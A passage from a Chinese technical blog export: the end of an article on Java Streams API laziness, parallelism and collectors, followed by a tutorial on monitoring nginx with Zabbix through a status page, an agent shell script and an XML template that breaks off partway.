这里的过滤操作和映射操作是惰性的，这意味着在调用sum()之前，我们不会从数据源提取任何元素。在sum操作开始之后，我们把过滤、映射以及求和混合在对数据源的一遍遍历之中。这样可以大大减少维持中间结果所带来的开销。 大多数循环都可以用数据源（数组、集合、生成函数以及I/O管道）上的聚合操作来表示：进行一系列惰性操作（过滤和映射等操作），然后用一个急性求值操作（forEach，toArray和collect等操作）得到最终结果——例如过滤—映射—累积，过滤—映射—排序—遍历等组合操作。惰性操作一般被用来计算中间结果，这在Streams API设计中得到了很好的体现——与其让filter和map返回一个集合，我们选择让它们返回一个新的流。在Streams API中，返回流对象的操作都是惰性操作，而返回非流对象的操作（或者无返回值的操作，例如forEach()）都是急性操作。绝大多数情况下，潜在的惰性操作会被用于聚合，这正是我们想要的——流水线中的每一轮操作都会接收输入流中的元素，进行转换，然后把转换结果传给下一轮操作。 在使用这种数据源—惰性操作—惰性操作—急性操作流水线时，流水线中的惰性几乎是不可见的，因为计算过程被夹在数据源和最终结果（或副作用操作）之间。这使得API的可用性和性能得到了改善。 对于anyMatch(Predicate)和findFirst()这些急性求值操作，我们可以使用短路（short-circuiting）来终止不必要的运算。以下面的流水线为例：123Optional&lt;Shape&gt; firstBlue = shapes.stream() .filter(s -&gt; s.getColor() == BLUE) .findFirst(); 由于过滤这一步是惰性的，findFirst在从其上游得到一个元素之后就会终止，这意味着我们只会处理这个元素及其之前的元素，而不是所有元素。findFirst()方法返回Optional对象，因为集合中有可能不存在满足条件的元素。Optional是一种用于描述可缺失值的类型。 在这种设计下，用户并不需要显式进行惰性求值，甚至他们都不需要了解惰性求值。类库自己会选择最优化的计算方式。 并行（Parallelism）流水线既可以串行执行也可以并行执行，并行或串行是流的属性。除非你显式要求使用并行流，否则JDK总会返回串行流。（串行流可以通过parallel()方法被转化为并行流） 尽管并行是显式的，但它并不需要成为侵入式的。利用parallelStream()，我们可以轻松的把之前重量求和的代码并行化：1234int sum = shapes.parallelStream() .filter(s -&gt; s.getColor = BLUE) .mapToInt(s -&gt; s.getWeight()) .sum();并行化之后和之前的代码区别并不大，然而我们可以很容易看出它是并行的（此外我们并不需要自己去实现并行代码）。 因为流的数据源可能是一个可变集合，如果在遍历流时数据源被修改，就会产生干扰（interference）。所以在进行流操作时，流的数据源应保持不变（held constant）。这个条件并不难维持，如果集合只属于当前线程，只要lambda表达式不修改流的数据源就可以。（这个条件和遍历集合时所需的条件相似，如果集合在遍历时被修改，绝大多数的集合实现都会抛出ConcurrentModificationException）我们把这个条件称为无干扰性（non-interference）。 我们应避免在传递给流方法的lambda产生副作用。一般来说，打印调试语句这种输出变量的操作是安全的，然而在lambda表达式里访问可变变量就有可能造成数据竞争或是其它意想不到的问题，因为lambda在执行时可能会同时运行在多个线程上，因而它们所看到的元素有可能和正常的顺序不一致。无干扰性有两层含义： 不要干扰数据源； 不要干扰其它lambda表达式，当一个lambda在修改某个可变状态而另一个lambda在读取该状态时就会产生这种干扰。 只要满足无干扰性，我们就可以安全的进行并行操作并得到可预测的结果，即便对线程不安全的集合（例如ArrayList）也是一样。 实例（Examples）下面的代码源自JDK中的Class类型（getEnclosingMethod方法），这段代码会遍历所有声明的方法，然后根据方法名称、返回类型以及参数的数量和类型进行匹配： 123456789101112131415161718192021for (Method method : enclosingInfo.getEnclosingClass().getDeclaredMethods()) { if (method.getName().equals(enclosingInfo.getName())) { Class&lt; ? &gt;[] candidateParamClasses = method.getParameterTypes(); if (candidateParamClasses.length == parameterClasses.length) { boolean matches = true; for (int i = 0; i &lt; candidateParamClasses.length; i += 1) { if (!candidateParamClasses[i].equals(parameterClasses[i])) { matches = false; break; } } if (matches) { // finally, check return type if (method.getReturnType().equals(returnType)) { return method; } } } }}throw new InternalError(\"Enclosing method not found\"); 通过使用流，我们不但可以消除上面代码里面所有的临时变量，还可以把控制逻辑交给类库处理。通过反射得到方法列表之后，我们利用Arrays.stream将它转化为Stream，然后利用一系列过滤器去除类型不符、参数不符以及返回值不符的方法，然后通过调用findFirst得到Optional，最后利用orElseThrow返回目标值或者抛出异常。 123456return Arrays.stream(enclosingInfo.getEnclosingClass().getDeclaredMethods()) .filter(m -&gt; Objects.equal(m.getName(), enclosingInfo.getName())) .filter(m -&gt; Arrays.equal(m.getParameterTypes(), parameterClasses)) .filter(m -&gt; Objects.equals(m.getReturnType(), returnType)) .findFirst() .orElseThrow(() -&gt; new InternalError(\"Enclosing method not found\")); 相对于未使用流的代码，这段代码更加紧凑，可读性更好，也不容易出错。 流操作特别适合对集合进行查询操作。假设有一个“音乐库”应用，这个应用里每个库都有一个专辑列表，每张专辑都有其名称和音轨列表，每首音轨表都有名称、艺术家和评分。 假设我们需要得到一个按名字排序的专辑列表，专辑列表里面的每张专辑都至少包含一首四星及四星以上的音轨，为了构建这个专辑列表，我们可以这么写： 1234567891011121314151617List&lt;Album&gt; favs = new ArrayList&lt;&gt;();for (Album album : albums) { boolean hasFavorite = false; for (Track track : album.tracks) { if (track.rating &gt;= 4) { hasFavorite = true; break; } } if (hasFavorite) favs.add(album);}Collections.sort(favs, new Comparator&lt;Album&gt;() { public int compare(Album a1, Album a2) { return a1.name.compareTo(a2.name); }}); 我们可以用流操作来完成上面代码中的三个主要步骤——识别一张专辑是否包含一首评分大于等于四星的音轨（使用anyMatch）；按名字排序；以及把满足条件的专辑放在一个List中：12345List&lt;Album&gt; sortedFavs = albums.stream() .filter(a -&gt; a.tracks.anyMatch(t -&gt; (t.rating &gt;= 4))) .sorted(Comparator.comparing(a -&gt; a.name)) .collect(Collectors.toList()); Compartor.comparing方法接收一个函数（该函数返回一个实现了Comparable接口的排序键值），然后返回一个利用该键值进行排序的Comparator（请参考下面的比较器工厂一节）。 收集器（Collectors）在之前的例子中，我们利用collect()方法把流中的元素聚合到List或Set中。collect()接收一个类型为Collector的参数，这个参数决定了如何把流中的元素聚合到其它数据结构中。Collectors类包含了大量常用收集器的工厂方法，toList()和toSet()就是其中最常见的两个，除了它们还有很多收集器，用来对数据进行对复杂的转换。 Collector的类型由其输入类型和输出类型决定。以toList()收集器为例，它的输入类型为T，输出类型为List，toMap是另外一个较为复杂的Collector，它有若干个版本。最简单的版本接收一对函数作为输入，其中一个函数用来生成键（key），另一个函数用来生成值（value）。toMap的输入类型是T，输出类型是Map，其中K和V分别是前面两个函数所生成的键类型和值类型。（复杂版本的toMap收集器则允许你指定目标Map的类型或解决键冲突）。举例来说，下面的代码以目录数字为键值创建一个倒排索引：123Map&lt;Integer, Album&gt; albumsByCatalogNumber = albums.stream() .collect(Collectors.toMap(a -&gt; a.getCatalogNumber(), a -&gt; a)); groupingBy是一个与toMap相类似的收集器，比如说我们想要把我们最喜欢的音乐按歌手列出来，这时我们就需要这样的Collector：它以Track作为输入，以Map","link":"/2017/04/17/Lambda%E7%B1%BB%E5%BA%93%E7%AF%87%20%E2%80%94%E2%80%94%20Streams%20API,%20Collector%E5%92%8C%E5%B9%B6%E8%A1%8C/"},{"title":"zabbix监控nginx","text":"zabbix监控nginx，首先需要配置ngx_status 启用nginx status配置在默认主机里面加上location或者你希望能访问到的主机里面。1234567891011server { listen *:80 default_server; server_name _; location /nginx-status { stub_status on; access_log off; #allow 127.0.0.1; #deny all; }} 重启nginx1service nginx restart 打开status页面123456# 如果nginx默认端口不是80 curl http://ip:port/nginx-status# curl http://127.0.0.1/nginx-statusActive connections: 11921 server accepts handled requests 11989 11989 11991 Reading: 0 Writing: 7 Waiting: 42 nginx status详解active connections – 活跃的连接数量server accepts handled requests — 总共处理了11989个连接 , 成功创建11989次握手, 总共处理了11991个请求reading — 读取客户端的连接数.writing — 响应数据到客户端的数量waiting — 开启 keep-alive 的情况下,这个值等于 active – (reading+writing), 意思就是 Nginx 已经处理完正在等候下一次请求指令的驻留连接. zabbix客户端配置安装zabbix agent客户端，并修改zabbix_agentd.conf文件1234567# vim /etc/zabbix/zabbix_agentd.confEnableRemoteCommands=1 来至zabbix服务器的远程命令是否允许被执行Server=zabbix_server_IP zabbix服务器ip地址ServerActive=zabbix_server_IP 主动向zabbix server发送监控内容Hostname=name name配置的内容要和zabbix服务器配置的Host name一致UnsafeUserParameters=1 是否启用自定义key,zabbix监控mysql、tomcat等数据时需要自定义key 编写客户端脚本ngx_status.sh, 存放/etc/zabbix/scripts目录，并赋予执行权限。1234567891011121314151617181920212223242526272829303132HOST=\"127.0.0.1\"PORT=\"80\" # 检测nginx进程是否存在function ping { /sbin/pidof nginx | wc -l }# 检测nginx性能function active { /usr/bin/curl \"http://$HOST:$PORT/nginx-status/\" 2&gt;/dev/null| grep 'Active' | awk '{print $NF}'}function reading { /usr/bin/curl \"http://$HOST:$PORT/nginx-status/\" 2&gt;/dev/null| grep 'Reading' | awk '{print $2}'}function writing { /usr/bin/curl \"http://$HOST:$PORT/nginx-status/\" 2&gt;/dev/null| grep 'Writing' | awk '{print $4}'}function waiting { /usr/bin/curl \"http://$HOST:$PORT/nginx-status/\" 2&gt;/dev/null| grep 'Waiting' | awk '{print $6}'}function accepts { /usr/bin/curl \"http://$HOST:$PORT/nginx-status/\" 2&gt;/dev/null| awk NR==3 | awk '{print $1}'}function handled { /usr/bin/curl \"http://$HOST:$PORT/nginx-status/\" 2&gt;/dev/null| awk NR==3 | awk '{print $2}'}function requests { /usr/bin/curl \"http://$HOST:$PORT/nginx-status/\" 2&gt;/dev/null| awk NR==3 | awk '{print $3}'}# 执行function$1 将自定义的UserParameter加入配置文件，然后重启agentd.1234# vim /etc/zabbix/zabbix_agentd.d/userparameter_mysql.confUserParameter=nginx.status[*],/etc/zabbix/scripts/ngx_status.sh $1#service zabbix-agent restart 服务器zabbix_get数据检测此步骤可以跳过，但最好还是测试一下，通过此命令检测客户端配置是否正确1234# /usr/bin/zabbix_get -s agentd机器ip -k 'nginx.status[accepts]'9570756# /usr/bin/zabbix_get -s agentd机器ip -k 'nginx.status[ping]'1 zabbix web端配置导入Template App NGINX模板模板已经写好，位于文章末尾。 Link NGINX模板到了最后一个阶段，登陆zabbix管理端，link模板到nginx服务器：configuration-&gt;hosts-&gt;点击nginx所在服务器-&gt;点击template-&gt;Link new templates输入”Template App NGINX”-&gt;Add-&gt;最后点击update。 Template App NGINX模板123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;zabbix_export&gt; &lt;version&gt;2.0&lt;/version&gt; &lt;date&gt;2016-10-6T01:29:50Z&lt;/date&gt; &lt;groups&gt; &lt;group&gt; &lt;name&gt;Templates&lt;/name&gt; &lt;/group&gt; &lt;/groups&gt; &lt;templates&gt; &lt;template&gt; &lt;template&gt;Template App NGINX&lt;/template&gt; &lt;name&gt;Template App NGINX&lt;/name&gt; &lt;description&gt;&lt;/description&gt; &lt;groups&gt; &lt;group&gt; &lt;name&gt;Templates&lt;/name&gt; &lt;/group&gt; &lt;/groups&gt; &lt;applications&gt; &lt;application&gt; &lt;name&gt;nginx&lt;/name&gt; &lt;/application&gt; &lt;/applications&gt; &lt;items&gt; &lt;item&gt; &lt;name&gt;nginx status connections active&lt;/name&gt; &lt;type&gt;0&lt;/type&gt; &lt;snmp_community/&gt; &lt;multiplier&gt;0&lt;/multiplier&gt; &lt;snmp_oid/&gt; &lt;key&gt;nginx.status[active]&lt;/key&gt; &lt;delay&gt;60&lt;/delay&gt; &lt;history&gt;90&lt;/history&gt; &lt;trends&gt;365&lt;/trends&gt; &lt;status&gt;0&lt;/status&gt; &lt;value_type&gt;3&lt;/value_type&gt; &lt;allowed_hosts/&gt; &lt;units/&gt; &lt;delta&gt;0&lt;/delta&gt; &lt;snmpv3_contextname/&gt; &lt;snmpv3_securityname/&gt; &lt;snmpv3_securitylevel&gt;0&lt;/snmpv3_securitylevel&gt; &lt;snmpv3_authprotocol&gt;0&lt;/snmpv3_authprotocol&gt; &lt;snmpv3_authpassphrase/&gt; &lt;snmpv3_privprotocol&gt;0&lt;/snmpv3_privprotocol&gt; &lt;snmpv3_privpassphrase/&gt; &lt;formula&gt;1&lt;/formula&gt; &lt;delay_flex/&gt; &lt;params/&gt; &lt;ipmi_sensor/&gt; &lt;data_type&gt;0&lt;/data_type&gt; &lt;authtype&gt;0&lt;/authtype&gt; &lt;username/&gt; &lt;password/&gt; &lt;publickey/&gt; &lt;privatekey/&gt; &lt;port/&gt; &lt;description&gt;active&lt;/description&gt; &lt;inventory_link&gt;0&lt;/inventory_link&gt; &lt;applications&gt; &lt;application&gt; &lt;name&gt;nginx&lt;/name&gt; &lt;/application&gt; &lt;/applications&gt; &lt;valuemap/&gt; &lt;logtimefmt/&gt; &lt;/item&gt; &lt;item&gt; &lt;name&gt;nginx status connections reading&lt;/name&gt; &lt;type&gt;0&lt;/type&gt; &lt;snmp_community/&gt; &lt;multiplier&gt;0&lt;/multiplier&gt; &lt;snmp_oid/&gt; &lt;key&gt;nginx.status[reading]&lt;/key&gt; &lt;delay&gt;60&lt;/delay&gt; &lt;history&gt;90&lt;/history&gt; &lt;trends&gt;365&lt;/trends&gt; &lt;status&gt;0&lt;/status&gt; &lt;value_type&gt;3&lt;/value_type&gt; &lt;allowed_hosts/&gt; &lt;units/&gt; &lt;delta&gt;0&lt;/delta&gt; &lt;snmpv3_contextname/&gt; &lt;snmpv3_securityname/&gt; &lt;snmpv3_securitylevel&gt;0&lt;/snmpv3_securitylevel&gt; &lt;snmpv3_authprotocol&gt;0&lt;/snmpv3_authprotocol&gt; &lt;snmpv3_authpassphrase/&gt; &lt;snmpv3_privprotocol&gt;0&lt;/snmpv3_privprotocol&gt; &lt;snmpv3_privpassphrase/&gt; &lt;formula&gt;1&lt;/formula&gt; &lt;delay_flex/&gt; &lt;params/&gt; &lt;ipmi_sensor/&gt; &lt;data_type&gt;0&lt;/data_type&gt; &lt;authtype&gt;0&lt;/authtype&gt; &lt;username/&gt; &lt;password/&gt; &lt;publickey/&gt; &lt;privatekey/&gt; &lt;port/&gt; &lt;description&gt;reading&lt;/description&gt; &lt;inventory_link&gt;0&lt;/inventory_link&gt; &lt;applications&gt; &lt;application&gt; &lt;name&gt;nginx&lt;/name&gt; &lt;/application&gt; &lt;/applications&gt; &lt;valuemap/&gt; &lt;logtimefmt/&gt; &lt;/item&gt; &lt;item&gt; &lt;name&gt;nginx status connections waiting&lt;/name&gt; &lt;type&gt;0&lt;/type&gt; &lt;snmp_community/&gt; &lt;multiplier&gt;0&lt;/multiplier&gt; &lt;snmp_oid/&gt; &lt;key&gt;nginx.status[waiting]&lt;/key&gt; &lt;delay&gt;60&lt;/delay&gt; &lt;history&gt;90&lt;/history&gt; &lt;trends&gt;365&lt;/trends&gt; &lt;status&gt;0&lt;/status&gt; &lt;value_type&gt;3&lt;/value_type&gt; &lt;allowed_hosts/&gt; &lt;units/&gt; &lt;delta&gt;0&lt;/delta&gt; &lt;snmpv3_contextname/&gt; &lt;snmpv3_securityname/&gt; &lt;snmpv3_securitylevel&gt;0&lt;/snmpv3_securitylevel&gt; &lt;snmpv3_authprotocol&gt;0&lt;/snmpv3_authprotocol&gt; &lt;snmpv3_authpassphrase/&gt; &lt;snmpv3_privprotocol&gt;0&lt;/snmpv3_privprotocol&gt; &lt;snmpv3_privpassphrase/&gt; &lt;formula&gt;1&lt;/formula&gt; &lt;delay_flex/&gt; &lt;params/&gt; &lt;ipmi_sensor/&gt; &lt;data_type&gt;0&lt;/data_type&gt; &lt;authtype&gt;0&lt;/authtype&gt; &lt;username/&gt; &lt;password/&gt; &lt;publickey/&gt; &lt;privatekey/&gt; &lt;port/&gt; &lt;description&gt;waiting&lt;/description&gt; &lt;inventory_link&gt;0&lt;/inventory_link&gt; &lt;applications&gt; &lt;application&gt; &lt;name&gt;nginx&lt;/name&gt; &lt;/application&gt; &lt;/applications&gt; &lt;valuemap/&gt; &lt;logtimefmt/&gt; &lt;/item&gt; &lt;item&gt; &lt;name&gt;nginx status connections writing&lt;/name&gt; &lt;type&gt;0&lt;/type&gt; &lt;snmp_community/&gt; &lt;multiplier&gt;0&lt;/multiplier&gt; &lt;snmp_oid/&gt; &lt;key&gt;nginx.status[writing]&lt;/key&gt; &lt;delay&gt;60&lt;/delay&gt; &lt;history&gt;90&lt;/history&gt; &lt;trends&gt;365&lt;/trends&gt; &lt;status&gt;0&lt;/status&gt; &lt;value_type&gt;3&lt;/value_type&gt; &lt;allowed_hosts/&gt; &lt;units/&gt; &lt;delta&gt;0&lt;/delta&gt; &lt;snmpv3_contextname/&gt; &lt;snmpv3_securityname/&gt; &lt;snmpv3_securitylevel&gt;0&lt;/snmpv3_securitylevel&gt; &lt;snmpv3_authprotocol&gt;0&lt;/snmpv3_authprotocol&gt; &lt;snmpv3_authpassphrase/&gt; &lt;snmpv3_privprotocol&gt;0&lt;/snmpv3_privprotocol&gt; &lt;snmpv3_privpassphrase/&gt; &lt;formula&gt;1&lt;/formula&gt; &lt;delay_flex/&gt; &lt;params/&gt; &lt;ipmi_sensor/&gt; &lt;data_type&gt;0&lt;/data_type&gt; &lt;authtype&gt;0&lt;/authtype&gt; &lt;username/&gt; &lt;password/&gt; &lt;publickey/&gt; &lt;privatekey/&gt; &lt;port/&gt; &lt;description&gt;writing&lt;/description&gt; &lt;inventory_link&gt;0&lt;/inventory_link&gt; &lt;applications&gt; &lt;application&gt; &lt;name&gt;nginx&lt;/name&gt; &lt;/application&gt; &lt;/applications&gt; &lt;valuemap/&gt; &lt;logtimefmt/&gt; &lt;/item&gt; &lt;item&gt; &lt;name&gt;nginx status PING&lt;/name&gt; &lt;type&gt;0&lt;/type&gt; &lt;snmp_community/&gt; &lt;multiplier&gt;0&lt;/multiplier&gt; &lt;snmp_oid/&gt; &lt;key&gt;nginx.status[ping]&lt;/key&gt; &lt;delay&gt;60&lt;/delay&gt; &lt;history&gt;30&lt;/history&gt; &lt;trends&gt;365&lt;/trends&gt; &lt;status&gt;0&lt;/status&gt; &lt;value_type&gt;3&lt;/value_type&gt; &lt;allowed_hosts/&gt; &lt;units/&gt; &lt;delta&gt;0&lt;/delta&gt; &lt;snmpv3_contextname/&gt; &lt;snmpv3_securityname/&gt; &lt;snmpv3_securitylevel&gt;0&lt;/snmpv3_securitylevel&gt; &lt;snmpv3_authprotocol&gt;0&lt;/snmpv3_authprotocol&gt; &lt;snmpv3_authpassphrase/&gt; &lt;snmpv3_privprotocol&gt;0&lt;/snmpv3_privprotocol&gt; &lt;snmpv3_privpassphrase/&gt; &lt;formula&gt;1&lt;/formula&gt; &lt;delay_flex/&gt; &lt;params/&gt; &lt;ipmi_sensor/&gt; &lt;data_type&gt;0&lt;/data_type&gt; &lt;authtype&gt;0&lt;/authtype&gt; &lt;username/&gt; &lt;password/&gt; &lt;publickey/&gt; &lt;privatekey/&gt; &lt;port/&gt; &lt;description&gt;is live&lt;/description&gt; &lt;inventory_link&gt;0&lt;/inventory_link&gt; &lt;applications&gt; &lt;application&gt; &lt;name&gt;nginx&lt;/name&gt; &lt;/application&gt; &lt;/applications&gt; &lt;valuemap&gt; &lt;name&gt;Service state&lt;/name&gt; &lt;/valuemap&gt; &lt;logtimefmt/&gt; &lt;/item&gt; &lt;item&gt; &lt;name&gt;nginx status server accepts&lt;/name&gt; &lt;type&gt;0&lt;/type&gt; &lt;snmp_community/&gt; &lt;multiplier&gt;0&lt;/multiplier&gt; &lt;snmp_oid/&gt; &lt;key&gt;nginx.status[accepts]&lt;/key&gt; &lt;delay&gt;60&lt;/delay&gt; &lt;history&gt;90&lt;/history&gt; &lt;trends&gt;365&lt;/trends&gt; &lt;status&gt;0&lt;/status&gt; &lt;value_type&gt;3&lt;/value_type&gt; &lt;allowed_hosts/&gt; &lt;units/&gt; &lt;delta&gt;1&lt;/delta&gt; &lt;snmpv3_contextname/&gt; &lt;snmpv3_securityname/&gt; &lt;snmpv3_securitylevel&gt;0&lt;/snmpv3_securitylevel&gt; &lt;snmpv3_authprotocol&gt;0&lt;/snmpv3_authprotocol&gt; &lt;snmpv3_authpassphrase/&gt; &lt;snmpv3_privprotocol&gt;0&lt;/snmpv3_privprotocol&gt; &lt;snmpv3_privpassphrase/&gt; &lt;formula&gt;1&lt;/formula&gt; &lt;delay_flex/&gt; &lt;params/&gt; &lt;ipmi_sensor/&gt; &lt;data_type&gt;0&lt;/data_type&gt; &lt;authtype&gt;0&lt;/authtype&gt; &lt;username/&gt; &lt;password/&gt; &lt;publickey/&gt; &lt;privatekey/&gt; &lt;port/&gt; &lt;description&gt;accepts&lt;/description&gt; &lt;inventory_link&gt;0&lt;/inventory_link&gt; &lt;applications&gt; &lt;application&gt; &lt;name&gt;nginx&lt;/name&gt; &lt;/application&gt; &lt;/applications&gt; &lt;valuemap/&gt; &lt;logtimefmt/&gt; &lt;/item&gt; &lt;item&gt; &lt;name&gt;nginx status server handled&lt;/name&gt; &lt;type&gt;0&lt;/type&gt; &lt;snmp_community/&gt; &lt;multiplier&gt;0&lt;/multiplier&gt; &lt;snmp_oid/&gt; &lt;key&gt;nginx.status[handled]&lt;/key&gt; &lt;delay&gt;60&lt;/delay&gt; &lt;history&gt;90&lt;/history&gt; &lt;trends&gt;365&lt;/trends&gt; &lt;status&gt;0&lt;/status&gt; &lt;value_type&gt;3&lt;/value_type&gt; &lt;allowed_hosts/&gt; &lt;units/&gt; &lt;delta&gt;1&lt;/delta&gt; &lt;snmpv3_contextname/&gt; &lt;snmpv3_securityname/&gt; &lt;snmpv3_securitylevel&gt;0&lt;/snmpv3_securitylevel&gt; &lt;snmpv3_authprotocol&gt;0&lt;/snmpv3_authprotocol&gt; &lt;snmpv3_authpassphrase/&gt; &lt;snmpv3_privprotocol&gt;0&lt;/snmpv3_privprotocol&gt; &lt;snmpv3_privpassphrase/&gt; &lt;formula&gt;1&lt;/formula&gt; &lt;delay_flex/&gt; &lt;params/&gt; &lt;ipmi_sensor/&gt; &lt;data_type&gt;0&lt;/data_type&gt; &lt;authtype&gt;0&lt;/authtype&gt; &lt;username/&gt; &lt;password/&gt; &lt;publickey/&gt; &lt;privatekey/&gt; &lt;port/&gt; &lt;description&gt;handled&lt;/description&gt; &lt;inventory_link&gt;0&lt;/inventory_link&gt; &lt;applications&gt; &lt;application&gt; &lt;name&gt;nginx&lt;/name&gt; &lt;/application&gt; &lt;/applications&gt; &lt;valuemap/&gt; &lt;logtimefmt/&gt; &lt;/item&gt; &lt;item&gt; &lt;name&gt;nginx status server requests&lt;/name&gt; &lt;type&gt;0&lt;/type&gt; &lt;snmp_community/&gt; &lt;multiplier&gt;0&lt;/multiplier&gt; &lt;snmp_oid/&gt; &lt;key&gt;nginx.status[requests]&lt;/key&gt; &lt;delay&gt;60&lt;/delay&gt; &lt;history&gt;90&lt;/history&gt; &lt;trends&gt;365&lt;/trends&gt; &lt;status&gt;0&lt;/status&gt; &lt;value_type&gt;3&lt;/value_type&gt; &lt;allowed_hosts/&gt; &lt;units/&gt; &lt;delta&gt;1&lt;/delta&gt; &lt;snmpv3_contextname/&gt; &lt;snmpv3_securityname/&gt; &lt;snmpv3_securitylevel&gt;0&lt;/snmpv3_securitylevel&gt; &lt;snmpv3_authprotocol&gt;0&lt;/snmpv3_authprotocol&gt; &lt;snmpv3_authpassphrase/&gt; &lt;snmpv3_privprotocol&gt;0&lt;/snmpv3_privprotocol&gt; &lt;snmpv3_privpassphrase/&gt; &lt;formula&gt;1&lt;/formula&gt; &lt;delay_flex/&gt; &lt;params/&gt; &lt;ipmi_sensor/&gt; &lt;data_type&gt;0&lt;/data_type&gt; &lt;authtype&gt;0&lt;/authtype&gt; &lt;username/&gt; &lt;password/&gt; &lt;publickey/&gt; &lt;privatekey/&gt; &lt;port/&gt; &lt;description&gt;requests&lt;/description&gt; &lt;inventory_link&gt;0&lt;/inventory_link&gt; &lt;applications&gt; &lt;application&gt; &lt;name&gt;nginx&lt;/name&gt; &lt;/application&gt; &lt;/applications&gt; &lt;valuemap/&gt; &lt;logtimefmt/&gt; &lt;/item&gt; &lt;/items&gt; &lt;discovery_rules/&gt; &lt;macros/&gt; &lt;templates/&gt; &lt;screens/&gt; &lt;/template&gt; &lt;/templates&gt; &lt;triggers&gt; &lt;trigger&gt; &lt;expression&gt;{Template App NGINX:nginx.status[ping].last()}=0&lt;/expression&gt; &lt;name&gt;nginx was down!&lt;/name&gt; &lt;url/&gt; &lt;status&gt;0&lt;/status&gt; &lt;priority&gt;4&lt;/priority&gt; &lt;description&gt;NGINX进程数：0，请注意&lt;/description&gt; &lt;type&gt;0&lt;/type&gt; &lt;dependencies/&gt; &lt;/trigger&gt; &lt;/triggers&gt; &lt;graphs&gt; &lt;graph&gt; &lt;name&gt;nginx status connections&lt;/name&gt; &lt;width&gt;900&lt;/width&gt; &lt;height&gt;200&lt;/height&gt; &lt;yaxismin&gt;0.0000&lt;/yaxismin&gt; &lt;yaxismax&gt;100.0000&lt;/yaxismax&gt; &lt;show_work_period&gt;1&lt;/show_work_period&gt; &lt;show_triggers&gt;1&lt;/show_triggers&gt; &lt;type&gt;0&lt;/type&gt; &lt;show_legend&gt;1&lt;/show_legend&gt; &lt;show_3d&gt;0&lt;/show_3d&gt; &lt;percent_left&gt;0.0000&lt;/percent_left&gt; &lt;percent_right&gt;0.0000&lt;/percent_right&gt; &lt;ymin_type_1&gt;0&lt;/ymin_type_1&gt; &lt;ymax_type_1&gt;0&lt;/ymax_type_1&gt; &lt;ymin_item_1&gt;0&lt;/ymin_item_1&gt; &lt;ymax_item_1&gt;0&lt;/ymax_item_1&gt; &lt;graph_items&gt; &lt;graph_item&gt; &lt;sortorder&gt;0&lt;/sortorder&gt; &lt;drawtype&gt;0&lt;/drawtype&gt; &lt;color&gt;00C800&lt;/color&gt; &lt;yaxisside&gt;0&lt;/yaxisside&gt; &lt;calc_fnc&gt;2&lt;/calc_fnc&gt; &lt;type&gt;0&lt;/type&gt; &lt;item&gt; &lt;host&gt;Template App NGINX&lt;/host&gt; &lt;key&gt;nginx.status[active]&lt;/key&gt; &lt;/item&gt; &lt;/graph_item&gt; &lt;graph_item&gt; &lt;sortorder&gt;1&lt;/sortorder&gt; &lt;drawtype&gt;0&lt;/drawtype&gt; &lt;color&gt;C80000&lt;/color&gt; &lt;yaxisside&gt;0&lt;/yaxisside&gt; &lt;calc_fnc&gt;2&lt;/calc_fnc&gt; &lt;type&gt;0&lt;/type&gt; &lt;item&gt; &lt;host&gt;Template App NGINX&lt;/host&gt; &lt;key&gt;nginx.status[reading]&lt;/key&gt; &lt;/item&gt; &lt;/graph_item&gt; &lt;graph_item&gt; &lt;sortorder&gt;2&lt;/sortorder&gt; &lt;drawtype&gt;0&lt;/drawtype&gt; &lt;color&gt;0000C8&lt;/color&gt; &lt;yaxisside&gt;0&lt;/yaxisside&gt; &lt;calc_fnc&gt;2&lt;/calc_fnc&gt; &lt;type&gt;0&lt;/type&gt; &lt;item&gt; &lt;host&gt;Template App NGINX&lt;/host&gt; &lt;key&gt;nginx.status[waiting]&lt;/key&gt; &lt;/item&gt; &lt;/graph_item&gt; &lt;graph_item&gt; &lt;sortorder&gt;3&lt;/sortorder&gt; &lt;drawtype&gt;0&lt;/drawtype&gt; &lt;color&gt;C800C8&lt;/color&gt; &lt;yaxisside&gt;0&lt;/yaxisside&gt; &lt;calc_fnc&gt;2&lt;/calc_fnc&gt; &lt;type&gt;0&lt;/type&gt; &lt;item&gt; &lt;host&gt;Template App NGINX&lt;/host&gt; &lt;key&gt;nginx.status[writing]&lt;/key&gt; &lt;/item&gt; &lt;/graph_item&gt; &lt;/graph_items&gt; &lt;/graph&gt; &lt;graph&gt; &lt;name&gt;nginx status server&lt;/name&gt; &lt;width&gt;900&lt;/width&gt; &lt;height&gt;200&lt;/height&gt; &lt;yaxismin&gt;0.0000&lt;/yaxismin&gt; &lt;yaxismax&gt;100.0000&lt;/yaxismax&gt; &lt;show_work_period&gt;1&lt;/show_work_period&gt; &lt;show_triggers&gt;1&lt;/show_triggers&gt; &lt;type&gt;0&lt;/type&gt; &lt;show_legend&gt;1&lt;/show_legend&gt; &lt;show_3d&gt;0&lt;/show_3d&gt; &lt;percent_left&gt;0.0000&lt;/percent_left&gt; &lt;percent_right&gt;0.0000&lt;/percent_right&gt; &lt;ymin_type_1&gt;0&lt;/ymin_type_1&gt; &lt;ymax_type_1&gt;0&lt;/ymax_type_1&gt; &lt;ymin_item_1&gt;0&lt;/ymin_item_1&gt; &lt;ymax_item_1&gt;0&lt;/ymax_item_1&gt; &lt;graph_items&gt; &lt;graph_item&gt; &lt;sortorder&gt;0&lt;/sortorder&gt; &lt;drawtype&gt;0&lt;/drawtype&gt; &lt;color&gt;00C800&lt;/color&gt; &lt;yaxisside&gt;0&lt;/yaxisside&gt; &lt;calc_fnc&gt;2&lt;/calc_fnc&gt; &lt;type&gt;0&lt;/type&gt; &lt;item&gt; &lt;host&gt;Template App NGINX&lt;/host&gt; 